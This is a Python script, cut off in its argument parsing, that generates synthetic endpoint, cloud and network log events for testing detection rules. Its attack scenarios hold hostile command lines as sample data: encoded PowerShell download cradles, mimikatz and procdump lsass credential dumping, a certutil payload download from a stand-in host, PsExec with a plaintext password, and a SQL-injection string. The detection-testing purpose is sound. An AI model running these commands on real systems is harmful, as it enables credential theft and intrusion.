"""
generate_logs.py — AI-assisted synthetic MDE log generator.

Generates realistic synthetic log datasets for testing detection rules and
demonstrating platform capabilities. Every generated event conforms to MDE
table schemas exactly — field names, ActionType enumerations, and value formats
match what real MDE produces so detection rules are portable without modification.

Usage:
    python scripts/generate_logs.py \\
        --table DeviceProcessEvents \\
        --events 1000 \\
        --attack-ratio 0.05 \\
        --scenario encoded-powershell \\
        --output ./generated/ \\
        --seed 42
"""

import argparse
import json
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

# Add parent to path so we can import backend modules
sys.path.insert(0, str(Path(__file__).parent.parent))

from backend.schema.mde_tables import ACTION_TYPES, MDE_TABLES

# ---------------------------------------------------------------------------
# Realistic value pools — match real MDE field value formats
# ---------------------------------------------------------------------------

_DEVICE_NAMES = [
    "CORP-WS-001", "CORP-WS-002", "CORP-WS-003", "CORP-WS-004", "CORP-WS-005",
    "DESKTOP-ABC123", "DESKTOP-XYZ789", "LAPTOP-HR-001", "LAPTOP-DEV-042",
    "SRV-DC01", "SRV-FILE01", "SRV-EXCHG01", "SRV-WEB01", "SRV-SQL01",
]

_USERNAMES = [
    "jsmith", "bjones", "amartin", "kwilliams", "lmiller", "dbrown",
    "rdavis", "cwilson", "tmoore", "sanderson", "administrator",
    "svc_backup", "svc_monitoring", "svc_deploy", "svc_scan",
]

_DOMAINS = ["CORP", "CONTOSO", "ACME", "corp.local"]

_BENIGN_PROCESSES = [
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
    ("msiexec.exe", "C:\\Windows\\System32\\msiexec.exe"),
    ("taskmgr.exe", "C:\\Windows\\System32\\taskmgr.exe"),
    ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe"),
    ("wscript.exe", "C:\\Windows\\System32\\wscript.exe"),
    ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ("teams.exe", "C:\\Users\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
]

_BENIGN_CMDLINES = [
    'svchost.exe -k netsvcs -p -s Schedule',
    '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
    'C:\\Windows\\system32\\svchost.exe -k LocalService',
    '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
    'C:\\Windows\\System32\\notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt',
    'C:\\Windows\\System32\\msiexec.exe /i "setup.msi" /qn',
]

# Malicious command lines per scenario
_ATTACK_SCENARIOS: dict[str, dict[str, Any]] = {
    "encoded-powershell": {
        "table": "DeviceProcessEvents",
        "mitre": ["T1059.001"],
        "detection_rules": ["FP-0001"],
        "events": [
            {
                "FileName": "powershell.exe",
                "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessCommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAG",
                "ActionType": "ProcessCreated",
                "InitiatingProcessFileName": "cmd.exe",
            },
            {
                "FileName": "powershell.exe",
                "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessCommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
                "ActionType": "ProcessCreated",
                "InitiatingProcessFileName": "wscript.exe",
            },
            {
                "FileName": "pwsh.exe",
                "FolderPath": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
                "ProcessCommandLine": "pwsh -ec JABpAHAAIAA9ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaQBlAG0AYQBjACkALgBDAG8AbgB0AGUAbgB0",
                "ActionType": "ProcessCreated",
                "InitiatingProcessFileName": "explorer.exe",
            },
        ],
    },
    "lsass-dump": {
        "table": "DeviceProcessEvents",
        "mitre": ["T1003.001"],
        "detection_rules": ["FP-0002"],
        "events": [
            {
                "FileName": "lsass.exe",
                "FolderPath": "C:\\Windows\\System32\\lsass.exe",
                "ActionType": "OpenProcessApiCall",
                "ProcessCommandLine": "",
                "InitiatingProcessFileName": "procdump64.exe",
                "InitiatingProcessCommandLine": "procdump64.exe -ma lsass.exe lsass.dmp",
            },
            {
                "FileName": "lsass.exe",
                "FolderPath": "C:\\Windows\\System32\\lsass.exe",
                "ActionType": "OpenProcessApiCall",
                "ProcessCommandLine": "",
                "InitiatingProcessFileName": "mimikatz.exe",
                "InitiatingProcessCommandLine": 'mimikatz.exe "sekurlsa::logonpasswords" exit',
            },
        ],
    },
    "registry-persistence": {
        "table": "DeviceRegistryEvents",
        "mitre": ["T1547.001"],
        "detection_rules": ["FP-0004"],
        "events": [
            {
                "ActionType": "RegistryValueSet",
                "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "RegistryValueName": "WindowsUpdate",
                "RegistryValueData": "C:\\Users\\jsmith\\AppData\\Roaming\\update.exe",
                "InitiatingProcessFileName": "powershell.exe",
                "InitiatingProcessCommandLine": "powershell.exe -Command Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Users\\jsmith\\AppData\\Roaming\\update.exe'",
            },
        ],
    },
    "lateral-movement": {
        "table": "DeviceNetworkEvents",
        "mitre": ["T1021", "T1570"],
        "detection_rules": ["FP-0007"],
        "events": [
            {
                "ActionType": "ConnectionSuccess",
                "RemoteIP": "10.0.1.50",
                "RemotePort": 445,
                "LocalIP": "10.0.1.10",
                "LocalPort": 49152,
                "Protocol": "TCP",
                "InitiatingProcessFileName": "PsExec.exe",
                "InitiatingProcessCommandLine": "PsExec.exe \\\\10.0.1.50 -u CORP\\administrator -p password123 cmd.exe",
                "InitiatingProcessAccountName": "jsmith",
            },
        ],
    },
    "certutil-download": {
        "table": "DeviceProcessEvents",
        "mitre": ["T1105", "T1027"],
        "detection_rules": ["FP-0006"],
        "events": [
            {
                "FileName": "certutil.exe",
                "FolderPath": "C:\\Windows\\System32\\certutil.exe",
                "ActionType": "ProcessCreated",
                "ProcessCommandLine": "certutil.exe -urlcache -split -f http://192.168.1.100/payload.exe C:\\Windows\\Temp\\update.exe",
                "InitiatingProcessFileName": "cmd.exe",
                "InitiatingProcessCommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.100/payload.exe C:\\Windows\\Temp\\update.exe",
            },
        ],
    },
    "brute-force": {
        "table": "DeviceLogonEvents",
        "mitre": ["T1110", "T1078"],
        "detection_rules": ["FP-0005"],
        "events": [
            {
                "ActionType": "LogonFailed",
                "AccountName": "administrator",
                "AccountDomain": "CORP",
                "LogonType": 3,
                "LogonTypeName": "Network",
                "FailureReason": "Unknown user name or bad password",
                "RemoteIP": "203.0.113.50",
                "IsLocalAdmin": False,
            },
        ],
    },
    # ------------------------------------------------------------------
    # AWS CloudTrail scenarios
    # ------------------------------------------------------------------
    "aws-root-usage": {
        "table": "AWSCloudTrailEvents",
        "mitre": ["T1078.004"],
        "detection_rules": ["FP-0008"],
        "events": [
            {
                "ActionType": "AuthAttempt",
                "UserIdentityType": "Root",
                "UserIdentityArn": "arn:aws:iam::123456789012:root",
                "UserIdentityName": "root",
                "EventSource": "signin.amazonaws.com",
                "EventName": "ConsoleLogin",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "203.0.113.50",
                "UserAgent": "Mozilla/5.0",
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
            {
                "ActionType": "ManagementRead",
                "UserIdentityType": "Root",
                "UserIdentityArn": "arn:aws:iam::123456789012:root",
                "UserIdentityName": "root",
                "EventSource": "iam.amazonaws.com",
                "EventName": "ListUsers",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "203.0.113.50",
                "UserAgent": "aws-cli/2.13.0",
                "ReadOnly": True,
                "MFAAuthenticated": False,
            },
        ],
    },
    "aws-cloudtrail-disable": {
        "table": "AWSCloudTrailEvents",
        "mitre": ["T1562.008"],
        "detection_rules": ["FP-0009"],
        "events": [
            {
                "ActionType": "ConfigChange",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "EventSource": "cloudtrail.amazonaws.com",
                "EventName": "StopLogging",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "aws-cli/2.13.0",
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
            {
                "ActionType": "ConfigChange",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "EventSource": "cloudtrail.amazonaws.com",
                "EventName": "DeleteTrail",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "aws-cli/2.13.0",
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
        ],
    },
    "aws-iam-escalation": {
        "table": "AWSCloudTrailEvents",
        "mitre": ["T1098", "T1136.003"],
        "detection_rules": ["FP-0010"],
        "events": [
            {
                "ActionType": "ManagementWrite",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "EventSource": "iam.amazonaws.com",
                "EventName": "CreateUser",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "python-boto3/1.28.0",
                "RequestParameters": {"userName": "backdoor-svc"},
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
            {
                "ActionType": "ManagementWrite",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "EventSource": "iam.amazonaws.com",
                "EventName": "AttachUserPolicy",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "python-boto3/1.28.0",
                "RequestParameters": {
                    "userName": "backdoor-svc",
                    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
                },
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
        ],
    },
    # ------------------------------------------------------------------
    # Cloudflare scenarios
    # ------------------------------------------------------------------
    "cloudflare-waf-spike": {
        "table": "CloudflareFirewallEvents",
        "mitre": ["T1190"],
        "detection_rules": ["FP-0011"],
        "events": [
            {
                "ActionType": "WAFBlock",
                "ClientIP": "203.0.113.99",
                "ClientCountry": "RU",
                "FirewallAction": "block",
                "FirewallRuleID": "waf-sqli-001",
                "FirewallRuleDescription": "SQLi attempt",
                "FirewallSource": "waf",
                "ClientRequestURI": f"/api/users?id=1' OR '1'='1",
                "ClientRequestMethod": "GET",
            }
            for _ in range(25)
        ],
    },
    "cloudflare-dns-threat": {
        "table": "CloudflareDnsEvents",
        "mitre": ["T1071.004"],
        "detection_rules": ["FP-0012"],
        "events": [
            {
                "ActionType": "DnsThreatMatch",
                "SourceIP": "10.0.0.42",
                "QueryName": "c2.evilcorp.ru",
                "QueryType": "A",
                "ResponseCode": "NOERROR",
                "ThreatCategory": "Command and Control",
                "ThreatIndicator": "c2.evilcorp.ru",
                "Blocked": True,
            },
        ],
    },
    # ------------------------------------------------------------------
    # Zscaler scenarios
    # ------------------------------------------------------------------
    "zscaler-malware-download": {
        "table": "ZscalerWebEvents",
        "mitre": ["T1105"],
        "detection_rules": ["FP-0013"],
        "events": [
            {
                "ActionType": "MalwareDetected",
                "UserName": "jsmith@corp.com",
                "Department": "Finance",
                "ClientIP": "10.0.0.55",
                "RequestURL": "http://malware-host.ru/payload.exe",
                "RequestHost": "malware-host.ru",
                "Protocol": "HTTP",
                "RequestMethod": "GET",
                "FileName": "payload.exe",
                "MalwareName": "Emotet.Gen",
                "MalwareClass": "Trojan",
                "FileSHA256": "a" * 64,
                "ResponseCode": 200,
                "SSLDecrypted": False,
            },
        ],
    },
    "zscaler-dlp": {
        "table": "ZscalerWebEvents",
        "mitre": ["T1048"],
        "detection_rules": ["FP-0014"],
        "events": [
            {
                "ActionType": "DlpViolation",
                "UserName": "insider@corp.com",
                "Department": "Engineering",
                "ClientIP": "10.0.0.77",
                "RequestURL": "https://drive.google.com/upload/d/largefile",
                "RequestHost": "drive.google.com",
                "Protocol": "HTTPS",
                "RequestMethod": "POST",
                "ResponseCode": 200,
                "BytesOut": 50_000_000,
                "PolicyName": "DLP-Sensitive-Data",
                "SSLDecrypted": True,
            },
        ] * 5,  # 5 violations to trigger threshold
    },
    "zscaler-dns-sinkhole": {
        "table": "ZscalerDnsEvents",
        "mitre": ["T1071.004"],
        "detection_rules": ["FP-0015"],
        "events": [
            {
                "ActionType": "DnsSinkhole",
                "UserName": "victim@corp.com",
                "ClientIP": "10.0.0.99",
                "QueryName": "beacon.apt29.io",
                "QueryType": "A",
                "ResponseCode": "NOERROR",
                "ThreatName": "APT29-Beacon",
                "ThreatCategory": "APT",
                "PolicyName": "Sinkhole-Threat-Intel",
            },
        ],
    },
}


def _random_sha256(rng: random.Random) -> str:
    return "".join(rng.choices("0123456789abcdef", k=64))


def _random_timestamp(base: datetime, offset_minutes: int, rng: random.Random) -> str:
    """Generate a realistic timestamp with small random jitter."""
    jitter = timedelta(seconds=rng.randint(0, 30))
    ts = base + timedelta(minutes=offset_minutes) + jitter
    return ts.isoformat()


def _generate_benign_process_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    proc_name, proc_path = rng.choice(_BENIGN_PROCESSES)
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "ProcessCreated",
        "FileName": proc_name,
        "FolderPath": proc_path,
        "SHA256": _random_sha256(rng),
        "MD5": "".join(rng.choices("0123456789abcdef", k=32)),
        "ProcessId": rng.randint(1000, 65535),
        "ProcessCommandLine": rng.choice(_BENIGN_CMDLINES),
        "AccountDomain": domain,
        "AccountName": user,
        "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
        "LogonId": f"0x{rng.randint(100000, 999999):x}",
        "InitiatingProcessId": rng.randint(100, 9999),
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "C:\\Windows\\Explorer.EXE",
        "InitiatingProcessParentFileName": "userinit.exe",
        "InitiatingProcessAccountName": user,
        "InitiatingProcessSHA256": _random_sha256(rng),
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_network_event(
    device: str, user: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    remote_ips = ["8.8.8.8", "1.1.1.1", "13.107.42.14", "52.114.132.73", "40.90.4.128"]
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "ConnectionSuccess",
        "RemoteIP": rng.choice(remote_ips),
        "RemotePort": rng.choice([80, 443, 8080, 8443]),
        "RemoteUrl": f"https://cdn.example.com/resource/{rng.randint(1000,9999)}",
        "LocalIP": f"10.0.1.{rng.randint(10,200)}",
        "LocalPort": rng.randint(49152, 65535),
        "Protocol": "TCP",
        "InitiatingProcessFileName": "chrome.exe",
        "InitiatingProcessCommandLine": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
        "InitiatingProcessAccountName": user,
        "InitiatingProcessId": rng.randint(1000, 65535),
        "InitiatingProcessSHA256": _random_sha256(rng),
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_logon_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "LogonSuccess",
        "AccountDomain": domain,
        "AccountName": user,
        "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
        "LogonType": 2,
        "LogonTypeName": "Interactive",
        "IsLocalAdmin": False,
        "FailureReason": None,
        "RemoteIP": None,
        "RemoteDeviceName": None,
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_registry_event(
    device: str, user: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    benign_keys = [
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Common\\Internet\\Server Cache",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
    ]
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "RegistryValueSet",
        "RegistryKey": rng.choice(benign_keys),
        "RegistryValueName": f"MRU{rng.randint(0, 10)}",
        "RegistryValueData": "C:\\Users\\jsmith\\Documents\\report.docx",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "C:\\Windows\\Explorer.EXE",
        "InitiatingProcessAccountName": user,
        "InitiatingProcessId": rng.randint(1000, 9999),
        "ReportId": str(uuid.uuid4()),
    }


_AWS_ACCOUNTS = ["123456789012", "234567890123", "345678901234"]
_AWS_REGIONS = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]
_AWS_SERVICES = [
    "s3.amazonaws.com", "ec2.amazonaws.com", "iam.amazonaws.com",
    "rds.amazonaws.com", "lambda.amazonaws.com", "cloudwatch.amazonaws.com",
]
_AWS_READ_OPS = [
    ("DescribeInstances", "ec2.amazonaws.com"),
    ("ListBuckets", "s3.amazonaws.com"),
    ("GetObject", "s3.amazonaws.com"),
    ("DescribeDBInstances", "rds.amazonaws.com"),
    ("ListFunctions", "lambda.amazonaws.com"),
    ("GetMetricStatistics", "cloudwatch.amazonaws.com"),
    ("ListUsers", "iam.amazonaws.com"),
    ("GetCallerIdentity", "sts.amazonaws.com"),
]
_CF_DOMAINS = ["api.corp.com", "www.corp.com", "cdn.corp.com", "app.corp.com"]
_CF_PATHS = ["/", "/api/v1/users", "/api/v1/products", "/static/main.js", "/favicon.ico"]
_ZS_USERS = ["alice@corp.com", "bob@corp.com", "charlie@corp.com", "diana@corp.com"]
_ZS_URLS = [
    ("https://www.google.com", "google.com"),
    ("https://microsoft.com/updates", "microsoft.com"),
    ("https://github.com/repos", "github.com"),
    ("https://slack.com/api/rtm", "slack.com"),
    ("https://www.linkedin.com/feed", "linkedin.com"),
]
_ZS_DNS_DOMAINS = [
    "www.google.com", "microsoft.com", "github.com",
    "slack.com", "teams.microsoft.com", "outlook.office365.com",
]


def _generate_benign_cloudtrail_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    event_name, event_source = rng.choice(_AWS_READ_OPS)
    account_id = rng.choice(_AWS_ACCOUNTS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "ManagementRead" if not event_source == "s3.amazonaws.com" else "DataAccess",
        "AccountId": account_id,
        "AccountName": None,
        "UserIdentityType": "IAMUser",
        "UserIdentityArn": f"arn:aws:iam::{account_id}:user/{user}",
        "UserIdentityName": user,
        "SessionName": None,
        "EventSource": event_source,
        "EventName": event_name,
        "EventCategory": "Management",
        "AWSRegion": rng.choice(_AWS_REGIONS),
        "SourceIPAddress": f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "UserAgent": rng.choice(["aws-cli/2.13.0", "python-boto3/1.28.0", "Terraform/1.5.0"]),
        "RequestParameters": None,
        "ResponseElements": None,
        "ErrorCode": None,
        "ErrorMessage": None,
        "ReadOnly": True,
        "MFAAuthenticated": True,
        "SharedEventID": None,
        "AdditionalFields": {},
    }


def _generate_benign_cloudflare_http_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": f"cf{rng.randint(100000000, 999999999):x}",
        "ActionType": "HttpRequest",
        "ClientIP": f"203.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "ClientPort": rng.randint(1024, 65535),
        "ClientCountry": rng.choice(["US", "GB", "DE", "CA", "AU"]),
        "ClientASN": rng.randint(1000, 65000),
        "ClientASNDescription": "CORP-ISP",
        "ClientRequestMethod": rng.choice(["GET", "GET", "GET", "POST"]),
        "ClientRequestHost": rng.choice(_CF_DOMAINS),
        "ClientRequestURI": rng.choice(_CF_PATHS),
        "ClientRequestUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
        "ClientRequestReferer": None,
        "ClientRequestBytes": rng.randint(200, 2000),
        "ClientSSLProtocol": "TLSv1.3",
        "ClientSSLCipher": "AEAD-AES256-GCM-SHA384",
        "EdgeResponseStatus": rng.choice([200, 200, 200, 304, 301]),
        "EdgeResponseBytes": rng.randint(1000, 50000),
        "EdgeColoCode": rng.choice(["DFW", "LHR", "SIN", "FRA"]),
        "EdgeServerIP": None,
        "OriginIP": "192.0.2.10",
        "OriginResponseStatus": 200,
        "OriginResponseTime": rng.randint(1000000, 50000000),
        "CacheCacheStatus": rng.choice(["HIT", "HIT", "MISS", "EXPIRED"]),
        "CacheTieredFill": False,
        "FirewallMatchesActions": None,
        "FirewallMatchesRuleIDs": None,
        "BotScore": rng.randint(1, 20),
        "BotScoreSrc": "Verified Bot",
        "ThreatScore": 0,
        "WorkerSubrequest": False,
        "ZoneName": rng.choice(_CF_DOMAINS),
        "AdditionalFields": {},
    }


def _generate_benign_cloudflare_dns_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "DnsQuery",
        "SourceIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "SourcePort": rng.randint(1024, 65535),
        "DeviceID": str(uuid.uuid4()),
        "DeviceName": None,
        "UserID": None,
        "AccountName": None,
        "QueryName": rng.choice(_ZS_DNS_DOMAINS),
        "QueryType": rng.choice(["A", "A", "A", "AAAA", "MX"]),
        "QueryTypeName": None,
        "ResponseCode": "NOERROR",
        "ResolvedIPs": [f"142.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"],
        "ResolverDecision": "ALLOW",
        "ThreatCategory": None,
        "ThreatIndicator": None,
        "PolicyName": None,
        "PolicyID": None,
        "Blocked": False,
        "ResponseDurationMs": rng.randint(1, 30),
        "ZoneName": None,
        "Location": "HQ",
        "AdditionalFields": {},
    }


def _generate_benign_zscaler_web_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    url, host = rng.choice(_ZS_URLS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "WebAllow",
        "UserName": rng.choice(_ZS_USERS),
        "Department": rng.choice(["Engineering", "Finance", "HR", "Sales"]),
        "Location": rng.choice(["HQ", "Branch-London", "Remote-VPN"]),
        "ClientIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "Protocol": "HTTPS",
        "RequestMethod": "GET",
        "RequestURL": url,
        "RequestHost": host,
        "RequestSize": rng.randint(200, 2000),
        "ResponseCode": 200,
        "ResponseSize": rng.randint(5000, 500000),
        "ResponseTime": rng.randint(50, 800),
        "ContentType": "text/html",
        "FileType": None,
        "FileName": None,
        "FileSHA256": None,
        "MalwareClass": None,
        "MalwareName": None,
        "ThreatCategory": None,
        "PolicyName": "Allow-Business",
        "RuleLabel": "allow-saas",
        "URLCategory": rng.choice(["Business and Economy", "Technology", "Social Networking"]),
        "CloudApplicationName": rng.choice(["Microsoft 365", "Google Workspace", "Slack"]),
        "CloudApplicationRisk": "Low",
        "SSLDecrypted": True,
        "DeviceOwner": "Managed",
        "DeviceName": device,
        "ServerIP": f"142.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "ServerPort": 443,
        "BytesIn": rng.randint(5000, 500000),
        "BytesOut": rng.randint(200, 5000),
        "DurationMs": rng.randint(50, 800),
        "AdditionalFields": {},
    }


def _generate_benign_zscaler_dns_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "DnsAllow",
        "UserName": rng.choice(_ZS_USERS),
        "Department": rng.choice(["Engineering", "Finance", "HR"]),
        "Location": "HQ",
        "ClientIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "QueryName": rng.choice(_ZS_DNS_DOMAINS),
        "QueryType": rng.choice(["A", "A", "AAAA"]),
        "ResponseCode": "NOERROR",
        "ResolvedIPs": [f"20.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"],
        "CategoryName": "Technology",
        "ThreatName": None,
        "ThreatCategory": None,
        "PolicyName": None,
        "DeviceName": device,
        "DeviceOwner": "Managed",
        "DnsDurationMs": rng.randint(1, 20),
        "DoHStatus": False,
        "AdditionalFields": {},
    }


_BENIGN_GENERATORS = {
    "DeviceProcessEvents": _generate_benign_process_event,
    "DeviceNetworkEvents": _generate_benign_network_event,
    "DeviceLogonEvents": _generate_benign_logon_event,
    "DeviceRegistryEvents": _generate_benign_registry_event,
    "AWSCloudTrailEvents": _generate_benign_cloudtrail_event,
    "CloudflareHttpEvents": _generate_benign_cloudflare_http_event,
    "CloudflareDnsEvents": _generate_benign_cloudflare_dns_event,
    "ZscalerWebEvents": _generate_benign_zscaler_web_event,
    "ZscalerDnsEvents": _generate_benign_zscaler_dns_event,
}


def generate(
    table: str,
    total_events: int,
    attack_ratio: float,
    scenario: str | None,
    seed: int,
) -> tuple[list[dict], dict]:
    """Generate synthetic log events.

    Returns:
        (events, manifest) tuple.
    """
    if table not in MDE_TABLES:
        raise ValueError(f"Unknown table '{table}'. Valid: {list(MDE_TABLES.keys())}")

    rng = random.Random(seed)
    now = datetime.now(timezone.utc)
    # Business hours distribution — 09:00-18:00 spread over the last 24h
    base_time = now - timedelta(hours=24)

    events: list[dict] = []
    attack_timestamps: list[str] = []
    malicious_count = 0
    mitre_techniques: list[str] = []
    expected_detections: list[str] = []

    attack_events: list[dict] = []
    if scenario and scenario in _ATTACK_SCENARIOS:
        scenario_data = _ATTACK_SCENARIOS[scenario]
        attack_events = scenario_data.get("events", [])
        mitre_techniques = scenario_data.get("mitre", [])
        expected_detections = scenario_data.get("detection_rules", [])

    malicious_total = int(total_events * attack_ratio)
    benign_total = total_events - malicious_total

    # Generate benign events with business-hours timestamps
    benign_gen = _BENIGN_GENERATORS.get(table)
    for i in range(benign_total):
        # Distribute over 9 hours of business activity
        minute_offset = rng.randint(0, 540)
        ts = _random_timestamp(base_time, minute_offset, rng)
        device = rng.choice(_DEVICE_NAMES)
        user = rng.choice(_USERNAMES)
        domain = rng.choice(_DOMAINS)

        if benign_gen:
            event = benign_gen(device, user, domain, ts, rng)
        else:
            event = {
                "Timestamp": ts,
                "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
                "DeviceName": device,
                "ActionType": rng.choice(ACTION_TYPES.get(table, ["Unknown"])),
                "ReportId": str(uuid.uuid4()),
            }
        events.append(event)

    # Inject attack events — clustered in last 2 hours for realistic timing
    attack_base = now - timedelta(hours=2)
    for i in range(malicious_total):
        if attack_events:
            template = rng.choice(attack_events).copy()
        else:
            template = {}

        ts = _random_timestamp(attack_base, i * 2, rng)
        attack_timestamps.append(ts)

        device = rng.choice(_DEVICE_NAMES[:5])  # Attacker uses fewer hosts
        user = rng.choice(_USERNAMES[:8])
        domain = rng.choice(_DOMAINS[:2])

        event = {
            "Timestamp": ts,
            "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
            "DeviceName": device,
            "AccountDomain": domain,
            "AccountName": user,
            "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
            "SHA256": _random_sha256(rng),
            "MD5": "".join(rng.choices("0123456789abcdef", k=32)),
            "ProcessId": rng.randint(1000, 65535),
            "InitiatingProcessId": rng.randint(100, 9999),
            "InitiatingProcessSHA256": _random_sha256(rng),
            "InitiatingProcessAccountName": user,
            "LogonId": f"0x{rng.randint(100000, 999999):x}",
            "InitiatingProcessParentFileName": "cmd.exe",
            "ReportId": str(uuid.uuid4()),
            **template,
        }
        event["Timestamp"] = ts  # Override template timestamp
        events.append(event)
        malicious_count += 1

    # Shuffle to interleave benign and malicious events
    rng.shuffle(events)

    manifest = {
        "table": table,
        "total_events": len(events),
        "malicious_events": malicious_count,
        "scenario": scenario,
        "mitre_techniques": mitre_techniques,
        "expected_detections": expected_detections,
        "attack_timestamps": attack_timestamps,
        "seed": seed,
    }

    return events, manifest


def main():
    parser = argparse.ArgumentParser(
        description="Generate synthetic MDE-compatible log events",
    )
    parser.add_argument("--table", required=True, help="Target MDE table name")
    parser.add_argument("--events", type=int, default=1000, help="Total event count")
    parser.add_argument("--attack-ratio", type=float, default=0.05, help="Fraction of malicious events")
    parser.add_argument("--scenario", default=None, choices=list(_ATTACK_SCENARIOS.keys()),
